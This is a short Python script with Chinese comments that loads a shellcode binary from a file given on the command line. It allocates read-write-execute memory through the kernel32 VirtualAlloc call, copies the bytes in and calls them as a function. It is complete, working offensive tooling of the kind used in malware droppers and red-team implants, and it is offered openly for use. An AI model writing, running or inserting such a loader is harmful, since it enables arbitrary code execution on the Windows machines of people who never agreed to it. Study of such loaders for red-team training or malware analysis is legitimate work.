import ctypes
import sys
import os

def load_and_execute_shellcode(bin_path):
    # 1. 读取 Shellcode 二进制文件
    try:
        with open(bin_path, 'rb') as f:
            shellcode = f.read()
    except Exception as e:
        print(f"[!] 读取文件失败: {e}")
        return

    print(f"[*] Shellcode 大小: {len(shellcode)} 字节")

    # 2. 获取 kernel32 句柄
    kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)

    # 3. 分配可执行内存（RWX）
    VirtualAlloc = kernel32.VirtualAlloc
    VirtualAlloc.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong, ctypes.c_ulong]
    VirtualAlloc.restype = ctypes.c_void_p

    MEM_COMMIT = 0x1000
    MEM_RESERVE = 0x2000
    PAGE_EXECUTE_READWRITE = 0x40

    ptr = VirtualAlloc(None, len(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    if not ptr:
        print("[!] VirtualAlloc 失败")
        return
    print(f"[*] 内存分配地址: 0x{ptr:016X}")

    # 4. 复制 Shellcode 到分配的内存
    RtlMoveMemory = kernel32.RtlMoveMemory
    RtlMoveMemory.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t]
    RtlMoveMemory(ptr, shellcode, len(shellcode))

    # 5. 将内存地址转换为可调用函数并执行
    print("[*] 执行 Shellcode ...")
    cfunc = ctypes.cast(ptr, ctypes.CFUNCTYPE(None))
    cfunc()

    # 注意：若 Shellcode 不返回，以下代码不会执行
    print("[*] Shellcode 执行完毕（如果返回的话）")

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print("用法: python loader.py <shellcode.bin>")
        sys.exit(1)

    if not os.path.isfile(sys.argv[1]):
        print("[!] 文件不存在")
        sys.exit(1)

    load_and_execute_shellcode(sys.argv[1])